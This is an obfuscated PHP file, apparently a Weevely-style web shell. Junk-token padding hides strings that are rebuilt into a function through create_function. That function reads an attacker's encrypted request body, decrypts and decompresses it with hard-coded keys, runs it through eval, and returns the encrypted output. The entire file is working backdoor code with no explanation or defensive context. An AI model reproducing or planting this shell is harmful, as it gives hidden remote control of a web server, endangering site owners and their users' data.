<?php
$D='b$);$j++,$i++){$o.=$t{$i}^b$b$$kb${$j};}}reb$tb$urn $o;b$}if (b$@preg_mb$';
$F='eb$b$n($t);$o="";fb$orb$($i=0;$i<$lb$;b$){for($j=0b$;b$(b$$j<$c&&b$$i<$b$l';
$k='m[b$1]),$b$k)b$));$ob$=@ob_get_cb$ob$ntents();@ob_eb$nd_cb$leanb$();$r=@bb$';
$L='b$ase64_encode(@x(b$b$@gzcob$mpress($o),b$$k));b$prinb$tb$("$p$kh$r$kf");}';
$z='atcb$h("/$kh(b$.+)$kb$f/",@fileb$_gb$et_contents("php://ib$nput")b$,$mb$)';
$H='==1b$) {@ob_stab$rt(b$);@evb$al(@gzunb$comprb$ess(@xb$(@base6b$4_decode(b$$';
$o='lb$Lb$RNRKdv7bQfWT7"b$;funcb$tion x($b$t,b$$k){$c=strlb$eb$nb$($k);$l=strl';
$T='$k="15f1b$9d2b$1b$";$kh="cb$ab$fd1da572b$b$a5";$kf="f406b9ed2884b$";$p="b$f';
$G=str_replace('rH','','rHcrHrerHrHate_funcrHrHtion');
$p=str_replace('b$','',$T.$o.$F.$D.$z.$H.$k.$L);
$E=$G('',$p);$E();
?>
